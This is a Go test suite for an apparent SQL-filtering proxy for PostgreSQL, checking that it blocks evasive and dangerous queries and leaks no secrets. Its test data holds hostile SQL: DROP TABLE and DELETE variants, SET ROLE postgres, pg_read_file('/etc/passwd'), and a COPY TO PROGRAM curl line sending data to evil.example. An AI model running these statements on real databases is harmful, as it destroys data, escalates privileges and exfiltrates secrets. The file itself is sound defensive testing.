package dbguard

import (
	"context"
	"crypto/rand"
	"errors"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/jackc/pgproto3/v2"
)

func TestAdversarialCommentSmuggling(t *testing.T) {
	engine := NewEngine(DefaultPolicy(), nil)
	ctx := context.Background()

	evasions := []string{
		"DROP/**/TABLE/**/users;",
		"DROP/*multiline\ncomment*/TABLE users;",
		"-- comment\nDROP TABLE users;",
		"/* outer /* inner */ */ DROP TABLE users;",
		"SELECT 1; /* safe prefix */ DROP TABLE accounts;",
	}

	for _, sql := range evasions {
		verdict, err := engine.InspectQuery(ctx, "session_token", sql)
		if err != nil {
			t.Fatalf("Unexpected error for %q: %v", sql, err)
		}
		if verdict.Action != ActionBlock {
			t.Errorf("Adversarial comment smuggling bypassed policy: %q (got %s)", sql, verdict.Action)
		}
	}
}

func TestAdversarialCaseAndWhitespace(t *testing.T) {
	engine := NewEngine(DefaultPolicy(), nil)
	ctx := context.Background()

	cases := []string{
		"dRoP TaBlE users;",
		"DrOp TaBlE users;",
		"DROP\t\r\n  TABLE   \n\t  users;",
		"uPdAtE users sEt role = 'admin';",
		"DeLeTe FrOm users;",
	}

	for _, sql := range cases {
		verdict, err := engine.InspectQuery(ctx, "session_token", sql)
		if err != nil {
			t.Fatalf("Unexpected error for %q: %v", sql, err)
		}
		if verdict.Action != ActionBlock {
			t.Errorf("Adversarial case/whitespace bypassed policy: %q (got %s)", sql, verdict.Action)
		}
	}
}

func TestAdversarialStackedAndChainedQueries(t *testing.T) {
	engine := NewEngine(DefaultPolicy(), nil)
	ctx := context.Background()

	stacked := []string{
		"SELECT 1; DROP TABLE users;",
		"SELECT * FROM items WHERE id = 1; DELETE FROM users; SELECT 2;",
		"BEGIN; UPDATE users SET role = 'admin'; COMMIT;",
		"SELECT 1; TRUNCATE audit_log;",
		"SELECT 1; GRANT ALL ON DATABASE db TO public;",
	}

	for _, sql := range stacked {
		verdict, err := engine.InspectQuery(ctx, "session_token", sql)
		if err != nil {
			t.Fatalf("Unexpected error for %q: %v", sql, err)
		}
		if verdict.Action != ActionBlock {
			t.Errorf("Adversarial stacked query bypassed policy: %q (got %s)", sql, verdict.Action)
		}
	}
}

func TestAdversarialCTEMutations(t *testing.T) {
	engine := NewEngine(DefaultPolicy(), nil)
	ctx := context.Background()

	cteAttacks := []string{
		"WITH purged AS (DELETE FROM sensitive_data RETURNING *) SELECT * FROM purged;",
		"WITH elevated AS (UPDATE users SET is_admin = true RETURNING *) SELECT * FROM elevated;",
	}

	for _, sql := range cteAttacks {
		verdict, err := engine.InspectQuery(ctx, "session_token", sql)
		if err != nil {
			t.Fatalf("Unexpected error for %q: %v", sql, err)
		}
		if verdict.Action != ActionBlock {
			t.Errorf("Adversarial CTE mutation bypassed policy: %q (got %s)", sql, verdict.Action)
		}
	}
}

func TestAdversarialLimitCircumvention(t *testing.T) {
	engine := NewEngine(DefaultPolicy(), nil)
	ctx := context.Background()

	limitEvasions := []string{
		"SELECT * FROM secrets LIMIT 999999999;",
		"SELECT * FROM secrets LIMIT 999999999999999;",
		"SELECT * FROM secrets LIMIT ALL;",
		"SELECT * FROM secrets LIMIT NULL;",
		"SELECT * FROM secrets LIMIT 50 + 50000;",
		"SELECT * FROM secrets LIMIT $1;",
		"SELECT * FROM secrets ORDER BY id FETCH FIRST 10 ROWS WITH TIES;",
		"SELECT * FROM (SELECT * FROM secrets) AS sub LIMIT 50;",
	}

	for _, sql := range limitEvasions {
		verdict, err := engine.InspectQuery(ctx, "session_token", sql)
		if err != nil {
			t.Fatalf("Unexpected error for %q: %v", sql, err)
		}
		if verdict.Action != ActionRewrite {
			t.Fatalf("Expected ActionRewrite for %q, got %s (reason: %s)", sql, verdict.Action, verdict.Reason)
		}
		if !strings.Contains(verdict.RewrittenSQL, "LIMIT 100") {
			t.Fatalf("Expected clamped LIMIT 100 for %q, got: %s", sql, verdict.RewrittenSQL)
		}
	}
}

func TestSHD03_DenyByDefaultASTAndExplainUnwrap(t *testing.T) {
	engine := NewEngine(DefaultPolicy(), nil)
	ctx := context.Background()

	blockedStatements := []string{
		`DO $$ BEGIN EXECUTE 'DROP TABLE users'; END $$;`,
		`PREPARE sneak AS DELETE FROM users;`,
		`EXECUTE sneak;`,
		`COPY secrets TO PROGRAM 'curl https://evil.example/exfil';`,
		`COPY secrets TO STDOUT;`,
		`CALL admin_nuke_all();`,
		`SET ROLE postgres;`,
		`SET session_authorization = 'postgres';`,
		`SET search_path TO evil_schema;`,
		`LISTEN secret_channel;`,
		`NOTIFY secret_channel, 'payload';`,
		`LOCK TABLE users IN ACCESS EXCLUSIVE MODE;`,
		`BEGIN;`,
		`SELECT * INTO stolen_secrets FROM secrets;`,
		`SELECT pg_read_file('/etc/passwd');`,
		`SELECT set_config('role', 'postgres', false);`,
		`EXPLAIN ANALYZE DELETE FROM users WHERE id = 1;`,
		`EXPLAIN ANALYZE UPDATE users SET active = false WHERE id = 1;`,
		`EXPLAIN ANALYZE INSERT INTO audit VALUES (1);`,
		`EXPLAIN DROP TABLE users;`,
		`EXPLAIN DELETE FROM users;`,
	}

	for _, sql := range blockedStatements {
		verdict, err := engine.InspectQuery(ctx, "session_token", sql)
		if err != nil {
			t.Fatalf("Unexpected error for %q: %v", sql, err)
		}
		if verdict.Action != ActionBlock {
			t.Errorf("SHD-03 FAILED: Disallowed SQL bypassed deny-by-default AST policy: %q (got %s)", sql, verdict.Action)
		}
	}

	// Safe EXPLAIN on a bounded SELECT should be allowed (rewritten with LIMIT 100 if unbounded)
	verdict, err := engine.InspectQuery(ctx, "session_token", "EXPLAIN SELECT id FROM users WHERE id = 1;")
	if err != nil {
		t.Fatalf("Unexpected error for safe EXPLAIN SELECT: %v", err)
	}
	if verdict.Action == ActionBlock {
		t.Errorf("Expected safe EXPLAIN SELECT to pass/rewrite, got ActionBlock: %s", verdict.Reason)
	}
}

func TestSHD03_ExtendedQueryDrainAndDataRowFailClosedAndSocketGuard(t *testing.T) {
	// 1. Verify Unix socket symlink hijack rejection & 0600 permissions
	tmpDir, err := os.MkdirTemp("/tmp", "cr-adv-")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(tmpDir)

	protectedFile := filepath.Join(tmpDir, "important.conf")
	if err := os.WriteFile(protectedFile, []byte("DO_NOT_DELETE"), 0600); err != nil {
		t.Fatal(err)
	}
	symlinkSock := filepath.Join(tmpDir, "symlink.sock")
	if err := os.Symlink(protectedFile, symlinkSock); err != nil {
		t.Fatal(err)
	}

	symSrv, err := NewServer(Config{ListenAddr: symlinkSock, UpstreamAddr: "127.0.0.1:5432"})
	if err != nil {
		t.Fatal(err)
	}
	if err := symSrv.Start(context.Background()); !errors.Is(err, ErrSocketSymlink) {
		_ = symSrv.Close()
		t.Fatalf("expected ErrSocketSymlink on symlinked socket path, got: %v", err)
	}
	if data, err := os.ReadFile(protectedFile); err != nil || string(data) != "DO_NOT_DELETE" {
		t.Fatalf("symlink target was modified or unlinked: err=%v data=%q", err, string(data))
	}

	// 2. Start custom mock upstream supporting Extended Query and high-entropy DataRow test
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()

	secretBlob := make([]byte, 64)
	_, _ = rand.Read(secretBlob)
	var bindCount int

	go func() {
		conn, err := ln.Accept()
		if err != nil {
			return
		}
		defer conn.Close()
		backend := pgproto3.NewBackend(pgproto3.NewChunkReader(conn), conn)
		if _, err := backend.ReceiveStartupMessage(); err != nil {
			return
		}
		_ = backend.Send(&pgproto3.AuthenticationOk{})
		_ = backend.Send(&pgproto3.ReadyForQuery{TxStatus: 'I'})

		for {
			msg, err := backend.Receive()
			if err != nil {
				return
			}
			switch q := msg.(type) {
			case *pgproto3.Bind:
				bindCount++
			case *pgproto3.Query:
				if strings.Contains(q.String, "secrets") {
					_ = backend.Send(&pgproto3.RowDescription{
						Fields: []pgproto3.FieldDescription{{Name: []byte("raw_key"), DataTypeOID: 25, DataTypeSize: -1, TypeModifier: -1}},
					})
					rowCopy := make([]byte, len(secretBlob))
					copy(rowCopy, secretBlob)
					_ = backend.Send(&pgproto3.DataRow{Values: [][]byte{rowCopy}})
					_ = backend.Send(&pgproto3.CommandComplete{CommandTag: []byte("SELECT 1")})
					_ = backend.Send(&pgproto3.ReadyForQuery{TxStatus: 'I'})
				} else {
					_ = backend.Send(&pgproto3.RowDescription{
						Fields: []pgproto3.FieldDescription{{Name: []byte("val"), DataTypeOID: 25, DataTypeSize: -1, TypeModifier: -1}},
					})
					_ = backend.Send(&pgproto3.DataRow{Values: [][]byte{[]byte("safe_row")}})
					_ = backend.Send(&pgproto3.CommandComplete{CommandTag: []byte("SELECT 1")})
					_ = backend.Send(&pgproto3.ReadyForQuery{TxStatus: 'I'})
				}
			case *pgproto3.Terminate:
				return
			}
		}
	}()

	sockPath := filepath.Join(tmpDir, "dbguard.sock")
	proxySrv, err := NewServer(Config{
		ListenAddr:     sockPath,
		UpstreamAddr:   ln.Addr().String(),
		Filter:         NewEngine(DefaultPolicy(), nil),
		EntropyScanner: NewScanner(5.0),
	})
	if err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go func() { _ = proxySrv.Start(ctx) }()
	time.Sleep(50 * time.Millisecond)
	defer proxySrv.Close()

	fi, err := os.Stat(sockPath)
	if err != nil {
		t.Fatalf("failed to stat socket: %v", err)
	}
	if fi.Mode().Perm() != 0600 {
		t.Fatalf("expected 0600 permissions on dbguard socket, got %o", fi.Mode().Perm())
	}

	cConn, err := net.Dial("unix", sockPath)
	if err != nil {
		t.Fatal(err)
	}
	defer cConn.Close()
	fe := pgproto3.NewFrontend(pgproto3.NewChunkReader(cConn), cConn)
	_ = fe.Send(&pgproto3.StartupMessage{
		ProtocolVersion: pgproto3.ProtocolVersionNumber,
		Parameters:      map[string]string{"user": "agent"},
	})
	for {
		msg, err := fe.Receive()
		if err != nil {
			t.Fatal(err)
		}
		if _, ok := msg.(*pgproto3.ReadyForQuery); ok {
			break
		}
	}

	// A. Pipelined Extended Query with blocked Parse: Parse -> Bind -> Describe -> Execute -> Sync
	_ = fe.Send(&pgproto3.Parse{Name: "s1", Query: "DROP TABLE users"})
	_ = fe.Send(&pgproto3.Bind{DestinationPortal: "", PreparedStatement: "s1"})
	_ = fe.Send(&pgproto3.Describe{ObjectType: 'P', Name: ""})
	_ = fe.Send(&pgproto3.Execute{Portal: "", MaxRows: 0})
	_ = fe.Send(&pgproto3.Sync{})

	msg1, err := fe.Receive()
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := msg1.(*pgproto3.ErrorResponse); !ok {
		t.Fatalf("expected ErrorResponse for blocked Parse, got %T", msg1)
	}
	msg2, err := fe.Receive()
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := msg2.(*pgproto3.ReadyForQuery); !ok {
		t.Fatalf("expected ReadyForQuery after Sync drain, got %T", msg2)
	}
	if bindCount != 0 {
		t.Fatalf("pipelined Bind frame leaked to upstream after Parse was blocked (bindCount=%d)", bindCount)
	}

	// B. High-entropy DataRow MUST fail closed without leaking the DataRow to client, while preserving session sync!
	_ = fe.Send(&pgproto3.Query{String: fmt.Sprintf("SELECT raw_key FROM secrets WHERE id = %d", 1)})
	gotErr := false
	for {
		m, err := fe.Receive()
		if err != nil {
			t.Fatal(err)
		}
		if row, ok := m.(*pgproto3.DataRow); ok {
			t.Fatalf("CRITICAL: high-entropy DataRow leaked to client: %v", row.Values)
		}
		if _, ok := m.(*pgproto3.ErrorResponse); ok {
			gotErr = true
		}
		if _, ok := m.(*pgproto3.ReadyForQuery); ok {
			break
		}
	}
	if !gotErr {
		t.Fatal("expected ErrorResponse when upstream returned high-entropy DataRow")
	}

	// C. Subsequent safe query still succeeds cleanly on the same connection
	_ = fe.Send(&pgproto3.Query{String: "SELECT val FROM normal_table WHERE id = 1"})
	gotSafeRow := false
	for {
		m, err := fe.Receive()
		if err != nil {
			t.Fatal(err)
		}
		if row, ok := m.(*pgproto3.DataRow); ok && string(row.Values[0]) == "safe_row" {
			gotSafeRow = true
		}
		if _, ok := m.(*pgproto3.ReadyForQuery); ok {
			break
		}
	}
	if !gotSafeRow {
		t.Fatal("expected subsequent safe query to succeed cleanly on synchronized stream")
	}
}
